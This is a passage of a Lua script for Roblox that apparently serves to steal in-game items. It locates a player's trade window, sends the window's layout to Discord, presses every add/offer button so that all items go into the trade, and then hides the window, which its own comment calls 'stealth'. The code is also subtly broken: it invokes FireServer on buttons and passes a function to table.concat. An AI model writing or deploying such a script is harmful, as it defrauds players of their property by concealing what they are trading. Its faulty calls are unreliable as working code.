-- --- Find the trade window (full-screen overlay)
local function findTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return nil end
    -- Look for a large Frame or ScreenGui that appears during trade
    local function search(parent)
        for _, child in pairs(parent:GetChildren()) do
            if child:IsA("ScreenGui") or child:IsA("Frame") then
                local size = child.AbsoluteSize
                if size.X > 100 and size.Y > 100 and child.Visible then
                    -- Check if it contains any TextButton with "Add" or "Accept"
                    local hasAdd, hasAccept = false, false
                    for _, sub in pairs(child:GetDescendants()) do
                        if sub:IsA("TextButton") then
                            local name = sub.Name:lower()
                            if name:find("add") or name:find("select") then hasAdd = true end
                            if name:find("accept") or name:find("confirm") then hasAccept = true end
                        end
                    end
                    if hasAdd and hasAccept then
                        return child
                    end
                end
            end
            local found = search(child)
            if found then return found end
        end
        return nil
    end
    return search(gui)
end

-- --- Log the structure of the trade window to Discord (for debugging)
local function logTradeStructure(tradeWindow)
    if not tradeWindow then
        send("Trade window not found.")
        return
    end
    local function describe(obj, indent)
        indent = indent or 0
        local pad = string.rep("  ", indent)
        local desc = pad .. obj.ClassName .. " : " .. obj.Name .. " (Size: " .. obj.AbsoluteSize.X .. "x" .. obj.AbsoluteSize.Y .. ")"
        if obj:IsA("TextButton") then
            desc = desc .. " Text: " .. (obj.Text or "")
        end
        return desc .. "\n" .. table.concat(obj:GetChildren(), function(child)
            return describe(child, indent+1)
        end)
    end
    local structure = describe(tradeWindow)
    send("Trade GUI structure:\n```lua\n" .. structure .. "\n```")
end

-- --- Click all "Add" / "Select" buttons in the trade window
local function addAllItemsViaGUI(tradeWindow)
    if not tradeWindow then return 0 end
    local count = 0
    -- First, look for an "Add All" button
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            if name:find("add all") or name:find("select all") or name:find("offer all") then
                pcall(function() btn:FireServer() end)
                print("Clicked Add All button")
                count = 1 -- assume all added
                return count
            end
        end
    end
    -- Otherwise, click each "Add" / "Select" button on item slots
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            if name:find("add") or name:find("select") or name:find("offer") then
                -- Check if this button is inside an item slot (parent is a Frame with an ImageLabel)
                local parent = btn.Parent
                if parent and parent:IsA("Frame") and parent:FindFirstChild("ImageLabel") then
                    pcall(function() btn:FireServer() end)
                    count = count + 1
                    print("Added item from slot: " .. parent.Name)
                end
            end
        end
    end
    return count
end

-- --- Hide the trade window (stealth)
local function hideTradeWindow(tradeWindow)
    if tradeWindow then
        if tradeWindow:IsA("ScreenGui") then
            tradeWindow.Enabled = false
        else
            tradeWindow.Visible = false
        end
        print("Trade window hidden.")
    end
end

